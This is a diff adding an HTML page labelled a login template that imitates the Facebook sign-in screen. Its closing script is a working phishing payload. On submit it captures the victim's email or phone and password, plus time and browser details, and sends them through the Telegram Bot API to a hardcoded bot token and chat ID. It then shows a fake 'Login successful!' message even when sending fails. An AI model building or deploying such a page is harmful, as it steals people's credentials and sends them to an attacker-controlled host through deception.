@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page Template</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .wrapper {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 80%;
+      max-width: 1000px;
+    }
+
+    /* Left side (logo + text) */
+    .left {
+      flex: 1;
+      padding: 20px;
+    }
+
+    .logo {
+      font-size: 48px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
+
+    .tagline {
+      font-size: 22px;
+      color: #333;
+    }
+
+    /* Right side (login box) */
+    .right {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-btn:hover {
+      background-color: #166fe0;
+    }
+
+    .link {
+      display: block;
+      margin: 10px 0;
+      text-align: center;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .create-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #42b72a;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .create-btn:hover {
+      background-color: #36a420;
+    }
+
+    /* Footer */
+    footer {
+      background: #fff;
+      color: #737373;
+      font-size: 12px;
+      padding: 20px 40px;
+      border-top: 1px solid #dddfe2;
+    }
+
+    .footer-languages,
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .footer-languages a,
+    .footer-links a {
+      text-decoration: none;
+      color: #737373;
+    }
+
+    .footer-languages a:hover,
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 10px;
+    }
+
+    @media (max-width: 768px) {
+      .wrapper {
+        flex-direction: column;
+        text-align: center;
+      }
+      .left {
+        margin-bottom: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Main Section -->
+  <div class="main">
+    <div class="wrapper">
+      <!-- Left section -->
+      <div class="left">
+        <div class="logo">facebook</div>
+        <div class="tagline">Connect with people and the world around you.</div>
+      </div>
+
+      <!-- Right section -->
+      <div class="right">
+        <div class="login-box">
+          <form id="loginForm">
+            <input type="text" id="username" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+          </form>
+          <a href="#" class="link">Forgot password?</a>
+          <hr>
+          <button class="create-btn">Create new account</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-languages">
+      <a href="#">English (US)</a>
+      <a href="#">Français (France)</a>
+      <a href="#">Español</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Português (Brasil)</a>
+      <a href="#">+ More</a>
+    </div>
+    <div class="footer-links">
+      <a href="#">Sign Up</a>
+      <a href="#">Log In</a>
+      <a href="#">About</a>
+      <a href="#">Privacy</a>
+      <a href="#">Cookies</a>
+      <a href="#">Help</a>
+      <a href="#">Careers</a>
+    </div>
+    <div class="copyright">MyApp © 2025</div>
+  </footer>
+
+  <script>
+    // Telegram configuration - YOU NEED TO REPLACE THESE WITH YOUR OWN VALUES
+    const TELEGRAM_BOT_TOKEN = '7530662027:AAG1PkN6cBEdvc_2mrawavLO6oNZoJlD5SY'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '8078410911'; // Replace with your chat ID
+    
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // Get form values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      // Create message
+      const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}\n\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
+      
+      // Send to Telegram
+      sendToTelegram(message);
+    });
+    
+    function sendToTelegram(message) {
+      // Using the Telegram Bot API
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Message sent to Telegram:', data);
+        alert('Login successful!'); // Fake success message
+      })
+      .catch(error => {
+        console.error('Error sending to Telegram:', error);
+        alert('Login successful!'); // Still show fake success
+      });
+    }
+  </script>
+</body>
+</html>
